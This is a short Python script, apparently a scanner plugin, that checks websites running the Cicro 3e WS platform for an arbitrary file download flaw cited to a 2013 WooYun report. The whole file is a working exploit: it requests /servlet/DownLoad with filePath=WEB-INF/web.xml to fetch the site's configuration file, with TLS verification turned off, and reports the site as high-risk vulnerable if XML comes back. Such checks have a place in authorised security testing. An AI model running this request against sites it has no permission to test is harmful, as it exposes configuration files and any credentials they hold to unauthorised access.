#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 时光动态网站平台(Cicro 3e WS) 任意文件下载
referer: http://wooyun.org/bugs/wooyun-2013-035064
author: Lucifer
description: 文件/servlet/DownLoad,参数filePath未过滤可以下载网站配置文件。
'''
import sys
import requests



class cicro_DownLoad_filedownload_BaseVerify():
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/servlet/DownLoad?filePath=WEB-INF/web.xml"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)

            if req.headers["Content-Type"] == "application/xml":
                return "[+]存在时光动态网站平台任意文件下载漏洞...(高危)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = cicro_DownLoad_filedownload_BaseVerify(sys.argv[1])
    testVuln.run()